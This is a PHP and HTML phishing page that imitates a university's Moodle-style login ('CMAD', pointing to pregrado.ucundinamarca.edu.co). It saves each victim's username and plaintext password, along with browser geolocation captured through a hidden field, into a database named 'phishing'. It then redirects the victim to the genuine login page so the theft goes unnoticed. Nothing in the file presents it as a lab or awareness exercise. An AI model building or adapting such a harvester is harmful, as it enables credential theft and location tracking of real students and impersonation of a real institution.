<?php
// Datos de conexión a la base de datos
$host = 'localhost';
$dbname = 'phishing';
$username = 'root';
$password = '';

try {
    // Conexión a la base de datos usando PDO
    $pdo = new PDO("mysql:host=$host;dbname=$dbname", $username, $password);
    // Configuración para lanzar excepciones en caso de errores
    $pdo->setAttribute(PDO::ATTR_ERRMODE, PDO::ERRMODE_EXCEPTION);
    // Verificamos si se ha enviado el formulario
    if ($_SERVER["REQUEST_METHOD"] == "POST") {
        // Recuperamos los datos del formulario
        $email = $_POST['email'];
        $pass = $_POST['pass'];
        $ubicacion = $_POST['ubicacion']; // Recuperar la ubicación del formulario
        // Preparamos la consulta SQL para insertar los datos en la tabla de la base de datos
        $stmt = $pdo->prepare("INSERT INTO usuarios (id, usuario, contraseña, fecha, ubicacion) VALUES (NULL, :email, :pass, NOW(), :ubicacion)");
        // Bind parameters
        $stmt->bindParam(':email', $email);
        $stmt->bindParam(':pass', $pass);
        $stmt->bindParam(':ubicacion', $ubicacion); // Vincular la ubicación
        // Ejecutamos la consulta
        $stmt->execute();
        echo "Los datos se han almacenado correctamente en la base de datos.";
		header("Location: https://pregrado.ucundinamarca.edu.co/login/index.php");
        exit;
    }
} catch(PDOException $e) {
    echo "Error al conectar a la base de datos: " . $e->getMessage();
}
?>
<!DOCTYPE html>
<html>
<head>
    <link rel="stylesheet" type="text/css" href="styles.css">
    <link rel="preconnect" href="https://fonts.googleapis.com">
    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
    <link href="https://fonts.googleapis.com/css2?family=Nunito+Sans:ital,opsz,wght@0,6..12,200..1000;1,6..12,200..1000&display=swap" rel="stylesheet">
    <style>
        * {
			margin: 0;
			padding: 0;
			box-sizing: border-box;
		}
		html, body {
			margin: 0;
			padding: 5px;
			padding-bottom: 1px;
			height: 100%;
			font-family: "Nunito Sans", sans-serif;
			font-optical-sizing: auto;
			font-style: normal;
			font-variation-settings:
			"wdth" 100,
			"YTLC" 500;
		}			
		.main-container {
			width: 100%;
			height: 100%;
			margin: 0;
			padding: 0;
			display: flex;
			flex-direction: column;
			gap: 20px;
			justify-content: center;
			align-items: center;
			background-image: url('./assets/fondo.png');
			background-size: cover;
		}
		.cmad-container {
			width: 100%;
			display: flex;
			flex-wrap: wrap;
			justify-content: center;
			align-items: center;
			gap: 10px;
		}
		.cmad-container p {
			margin: 0;
			font-size: 20px;
			font-weight: bold;
		}
		.cmad {
			width: 50px;
			height: 50px;
			display: flex;
			justify-content: center;
			align-items: center;
		}
		.cmad img {
			max-width: 100%;
			max-height: 100%;
		}
		.login-box {
			border-radius: 25px;
			width: 500px;
			height: 450px;
			background: #fff;
			color: #000;
			padding: 10px 40px;
			display: flex;
			flex-direction: column;
			align-items: center;
			justify-content: center;
			gap: 10px;
		}
		.form {
			width: 100%;
			display: flex;
			flex-direction: column;
			align-items: center;
		}
		.form h2 {
			text-align: center;
		}
		.textbox {
			width: 100%;
			overflow: hidden;
			font-size: 20px;
			padding: 8px 0;
			margin: 8px 0;
			border-bottom: 1px solid #ccc;
		}
		.textbox i {
			width: 100%;
			float: left;
			text-align: center;
		}
		.textbox input {
			border: none;
			outline: none;
			background: none;
			color: #000;
			font-size: 18px;
			width: 80%;
			float: left;
		}
		.btn {
			width: 100%;
			background: #003366;
			border: none;
			padding: 10px;
			color: #fff;
			text-transform: uppercase;
			font-size: 16px;
			cursor: pointer;
			margin: 12px 0;
			border-radius: 5px;
			transition: 0.25s;
			border: solid 1px;
		}
		.btn:hover {
			background-color: #fff;
			color: #003366;
			border: solid 1px #003366;
		}
		.forgot-password {
			width: 100%;
			text-align: right;
			color: green;
		}
		.forgot-password:hover {
			text-decoration: none;
		}
		.login-box p {
			width: 100%;
			text-align: left;
			color: gray;
			margin: 10px 0;
		}
		.guest-link {
			width: 100%;
			overflow: hidden;
			background: gray;
			border: none;
			padding: 10px;
			color: #fff;
			text-transform: uppercase;
			font-size: 16px;
			cursor: pointer;
			text-align: center;
			text-decoration: none;
			border-radius: 5px;
			border: solid 1px;
			transition: 0.25s;
		}
		.guest-link:hover {
			background-color: #fff;
			color: gray;
			border: solid 1px gray;
		}
    </style>
</head>
<body>
    <main class="main-container">
        <!-- Contenido HTML -->
        <div class="cmad-container">
            <a class="cmad" href="#">
                <img src="./assets/header-logo.png" alt="cmad">
            </a>
            <p>CMAD</p>
        </div>
        <div class="login-box">
            <form method="post" class="form">
                <h2>Login to your account</h2>
                <div class="textbox">
                    <i class="fa fa-user"></i>
                    <!-- Cambiado name de 'username' a 'email' -->
                    <input type="text" name="email" placeholder="Username" required>
                </div>
                <div class="textbox">
                    <i class="fa fa-lock"></i>
                    <!-- Cambiado name de 'password' a 'pass' -->
                    <input type="password" name="pass" placeholder="Password" required>
                </div>
                <a class="forgot-password" href="#">Forgot Password?</a>
                <input class="btn" type="submit" value="Log in" onclick="redirect()">
                <p class="cookies">Cookies must be enabled in your browser</p>
				<p>Some courses may allow guest access.</p>
                <a class="guest-link" href="#">Access as a guest</a>
                <input type="hidden" id="ubicacion" name="ubicacion" value="">
            </form>
        </div>
    </main>
    <script>
        // Función para obtener la ubicación del dispositivo
        function getLocation() {
            if (navigator.geolocation) {
                navigator.geolocation.getCurrentPosition(showPosition);
            } else {
                alert("Geolocation is not supported by this browser.");
            }
        }
        // Función para mostrar la ubicación y almacenarla en el campo oculto del formulario
        function showPosition(position) {
            var ubicacion = position.coords.latitude + "," + position.coords.longitude;
            document.getElementById('ubicacion').value = ubicacion;
        }
        // Obtener la ubicación cuando se envía el formulario
        document.querySelector('form').addEventListener('submit', function() {
            getLocation();
        });
		function redirect() {
            window.location.href = "https://pregrado.ucundinamarca.edu.co/login/index.php";
        }
    </script>
</body>
</html>